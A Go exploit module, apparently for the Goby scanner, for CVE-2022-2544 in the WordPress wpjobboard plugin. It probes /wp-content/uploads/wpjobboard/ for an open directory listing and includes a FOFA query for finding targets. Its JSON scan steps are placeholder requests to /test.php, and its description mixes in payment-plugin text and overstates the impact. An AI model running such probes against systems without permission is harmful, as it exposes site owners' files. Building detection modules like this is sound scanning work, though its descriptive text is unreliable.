package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wordpress wpjobboard plugin wpjobboard directory traversal vulnerability (CVE-2022-2544)",
    "Description": "<p>Wpjobboard is a plugin of Wordpress. The Wpjobboard plug-in allows website owners to embed payment forms and make payments via Visa, American Express, Discover and Mastercard through their Click&amp;Lead merchant accounts.</p><p>The Wpjobboard plug-in has a directory traversal vulnerability, through which an attacker can view sensitive directories and files in the server, control the entire system, and finally cause the system to be in an extremely insecure state.</p>",
    "Product": "wordpress-wpjobboard",
    "Homepage": "https://cn.wordpress.org/plugins/click-pledge-wpjobboard/",
    "DisclosureDate": "2022-06-14",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"wp-content/plugins/wpjobboard\"",
    "GobyQuery": "body=\"wp-content/plugins/wpjobboard\"",
    "Level": "2",
    "Impact": "<p>The Wpjobboard plug-in has a directory traversal vulnerability, through which an attacker can view sensitive directories and files in the server, control the entire system, and finally cause the system to be in an extremely insecure state.</p>",
    "Recommendation": "<p>The manufacturer has released vulnerability fixes, please pay attention to the updates: <a href=\"https://cn.wordpress.org/plugins/click-pledge-wpjobboard/\">https://cn.wordpress.org/plugins/click-pledge-wpjobboard/</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-2544"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2022-2544"
    ],
    "CNNVD": [
        "CNNVD-202208-3647"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Wordpress wpjobboard 插件 wpjobboard 页面目录遍历漏洞（CVE-2022-2544）",
            "Product": "wordpress-wpjobboard",
            "Description": "<p>Wpjobboard 是 Wordpress 的一款插件。Wpjobboard插件允许网站所有者嵌入支付表单，通过Visa、American Express、Discover和Mastercard通过其Click Pledge商户账户进行支付。</p><p>Wpjobboard插件存在目录遍历漏洞，攻击者可通过该漏洞查看服务器中的敏感目录和文件，控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://cn.wordpress.org/plugins/click-pledge-wpjobboard/\">https://cn.wordpress.org/plugins/click-pledge-wpjobboard/</a><br></p>",
            "Impact": "<p>Wpjobboard插件存在目录遍历漏洞，攻击者可通过该漏洞查看服务器中的敏感目录和文件，控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Wordpress wpjobboard plugin wpjobboard directory traversal vulnerability (CVE-2022-2544)",
            "Product": "wordpress-wpjobboard",
            "Description": "<p>Wpjobboard is a plugin of Wordpress. The Wpjobboard plug-in allows website owners to embed payment forms and make payments via Visa, American Express, Discover and Mastercard through their Click&amp;Lead merchant accounts.</p><p>The Wpjobboard plug-in has a directory traversal vulnerability, through which an attacker can view sensitive directories and files in the server, control the entire system, and finally cause the system to be in an extremely insecure state.</p>",
            "Recommendation": "<p>The manufacturer has released vulnerability fixes, please pay attention to the updates: <a href=\"https://cn.wordpress.org/plugins/click-pledge-wpjobboard/\" target=\"_blank\">https://cn.wordpress.org/plugins/click-pledge-wpjobboard/</a><br></p>",
            "Impact": "<p>The Wpjobboard plug-in has a directory traversal vulnerability, through which an attacker can view sensitive directories and files in the server, control the entire system, and finally cause the system to be in an extremely insecure state.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/wp/wp-content/uploads/wpjobboard/")
			resp, err := httpclient.DoHttpRequest(hostinfo, cfg)
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/wp/wp-content/uploads/wpjobboard") && strings.Contains(resp.Utf8Html, "Index of") && strings.Contains(resp.Utf8Html, "Parent Directory") {
				return true
			} else {
				cfg = httpclient.NewGetRequestConfig("/wp-content/uploads/wpjobboard/")
				resp, err = httpclient.DoHttpRequest(hostinfo, cfg)
				if err != nil {
					return false
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/wp-content/uploads/wpjobboard") && strings.Contains(resp.Utf8Html, "Index of") && strings.Contains(resp.Utf8Html, "Parent Directory") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/wp/wp-content/uploads/wpjobboard/")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				expResult.Success = false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/wp/wp-content/uploads/wpjobboard") && strings.Contains(resp.Utf8Html, "Index of") && strings.Contains(resp.Utf8Html, "Parent Directory") {
				expResult.Success = true
				expResult.Output = "vulURl: " + expResult.HostInfo.FixedHostInfo + "/wp/wp-content/uploads/wpjobboard/"
			} else {
				cfg = httpclient.NewGetRequestConfig("/wp-content/uploads/wpjobboard/")
				resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				if err != nil {
					expResult.Success = false
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/wp-content/uploads/wpjobboard") && strings.Contains(resp.Utf8Html, "Index of") && strings.Contains(resp.Utf8Html, "Parent Directory") {
					expResult.Success = true
					expResult.Output = "vulURl: " + expResult.HostInfo.FixedHostInfo + "/wp-content/uploads/wpjobboard"
				}
			}
			return expResult
		},
	))
}